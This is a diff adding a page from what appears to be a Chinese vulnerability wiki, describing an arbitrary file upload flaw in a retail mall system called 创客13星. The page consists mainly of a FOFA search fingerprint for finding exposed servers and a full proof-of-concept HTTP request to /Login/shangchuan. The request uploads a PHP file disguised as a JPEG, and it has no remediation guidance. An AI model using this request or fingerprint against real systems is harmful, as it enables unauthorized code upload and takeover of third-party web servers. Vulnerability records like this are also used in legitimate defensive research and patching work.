@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%88%9B%E5%AE%A213%E6%98%9F%E9%9B%B6%E5%94%AE%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F/%E5%88%9B%E5%AE%A213%E6%98%9F%E9%9B%B6%E5%94%AE%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>创客13星零售商城系统前台任意文件上传漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u521b\u5ba213\u661f\u96f6\u552e\u5546\u57ce\u7cfb\u7edf\u524d\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "fofa", url: "#fofa" },
+              {title: "poc", url: "#poc" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E5%8C%97%E4%BA%AC%E4%B8%AD%E7%A7%91%E8%81%9A%E7%BD%91/%E5%8C%97%E4%BA%AC%E4%B8%AD%E7%A7%91%E8%81%9A%E7%BD%91%E4%B8%80%E4%BD%93%E5%8C%96%E8%BF%90%E8%90%A5%E5%B9%B3%E5%8F%B0catchByUrl%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E5%8C%97%E4%BA%AC%E4%B8%AD%E7%A7%91%E8%81%9A%E7%BD%91/%E5%8C%97%E4%BA%AC%E4%B8%AD%E7%A7%91%E8%81%9A%E7%BD%91%E4%B8%80%E4%BD%93%E5%8C%96%E8%BF%90%E8%90%A5%E5%B9%B3%E5%8F%B0catchByUrl%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        北京中科聚网一体化运营平台catchByUrl存在文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%88%86%E5%8F%91%E7%AD%BE%E5%90%8D%E7%B3%BB%E7%BB%9F/%E8%8B%B9%E6%9E%9CIOS%E7%AB%AFIPA%E7%AD%BE%E5%90%8D%E5%B7%A5%E5%85%B7request_post%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%88%86%E5%8F%91%E7%AD%BE%E5%90%8D%E7%B3%BB%E7%BB%9F/%E8%8B%B9%E6%9E%9CIOS%E7%AB%AFIPA%E7%AD%BE%E5%90%8D%E5%B7%A5%E5%85%B7request_post%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        苹果IOS端IPA签名工具request_post任意文件读取漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="13">创客13星零售商城系统前台任意文件上传漏洞<a class="headerlink" href="#13" title="Permanent link">&para;</a></h1>
+<p>创客13星零售商城系统前台任意文件上传漏洞</p>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="s">&quot;/Public/Xin/static/css/iconfont.css&quot;</span>
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="l l-Scalar l-Scalar-Plain">POST /Login/shangchuan HTTP/1.1</span>
+<span class="l l-Scalar l-Scalar-Plain">Accept</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+<span class="nt">Accept-Encoding</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">gzip, deflate, br, zstd</span>
+<span class="nt">Accept-Language</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7</span>
+<span class="nt">Cache-Control</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">max-age=0</span>
+<span class="nt">Connection</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">keep-alive</span>
+<span class="nt">Content-Length</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">197</span>
+<span class="nt">Content-Type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">multipart/form-data; boundary=----WebKitFormBoundaryBP56KuZOdlY4nLGg</span>
+<span class="nt">Host</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">127.0.0.1</span>
+<span class="nt">Origin</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">http://127.0.0.1</span>
+<span class="nt">Referer</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">http://127.0.0.1/Login/shangchuan</span>
+<span class="nt">Sec-Fetch-Dest</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">document</span>
+<span class="nt">Sec-Fetch-Mode</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">navigate</span>
+<span class="nt">Sec-Fetch-Site</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">none</span>
+<span class="nt">Upgrade-Insecure-Requests</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">1</span>
+<span class="nt">User-Agent</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36</span>
+<span class="nt">sec-ch-ua</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;Not/A)Brand&quot;</span><span class="l l-Scalar l-Scalar-Plain">;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;126&quot;, &quot;Google Chrome&quot;;v=&quot;126&quot;</span>
+<span class="nt">sec-ch-ua-mobile</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">?0</span>
+<span class="nt">sec-ch-ua-platform</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;Windows&quot;</span>
+<span class="nt">sec-fetch-user</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">?1</span>
+
+<span class="l l-Scalar l-Scalar-Plain">------WebKitFormBoundary03rNBzFMIytvpWhy</span>
+<span class="nt">Content-Disposition</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;</span>
+<span class="nt">Content-Type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">image/jpeg</span>
+
+<span class="l l-Scalar l-Scalar-Plain">&lt;?php phpinfo();?&gt;</span>
+<span class="l l-Scalar l-Scalar-Plain">------WebKitFormBoundary03rNBzFMIytvpWhy--</span>
+</code></pre></div>
+<p><img alt="图片" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407211609279.webp" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E5%8C%97%E4%BA%AC%E4%B8%AD%E7%A7%91%E8%81%9A%E7%BD%91/%E5%8C%97%E4%BA%AC%E4%B8%AD%E7%A7%91%E8%81%9A%E7%BD%91%E4%B8%80%E4%BD%93%E5%8C%96%E8%BF%90%E8%90%A5%E5%B9%B3%E5%8F%B0catchByUrl%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E5%8C%97%E4%BA%AC%E4%B8%AD%E7%A7%91%E8%81%9A%E7%BD%91/%E5%8C%97%E4%BA%AC%E4%B8%AD%E7%A7%91%E8%81%9A%E7%BD%91%E4%B8%80%E4%BD%93%E5%8C%96%E8%BF%90%E8%90%A5%E5%B9%B3%E5%8F%B0catchByUrl%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        北京中科聚网一体化运营平台catchByUrl存在文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%88%86%E5%8F%91%E7%AD%BE%E5%90%8D%E7%B3%BB%E7%BB%9F/%E8%8B%B9%E6%9E%9CIOS%E7%AB%AFIPA%E7%AD%BE%E5%90%8D%E5%B7%A5%E5%85%B7request_post%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%88%86%E5%8F%91%E7%AD%BE%E5%90%8D%E7%B3%BB%E7%BB%9F/%E8%8B%B9%E6%9E%9CIOS%E7%AB%AFIPA%E7%AD%BE%E5%90%8D%E5%B7%A5%E5%85%B7request_post%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        苹果IOS端IPA签名工具request_post任意文件读取漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
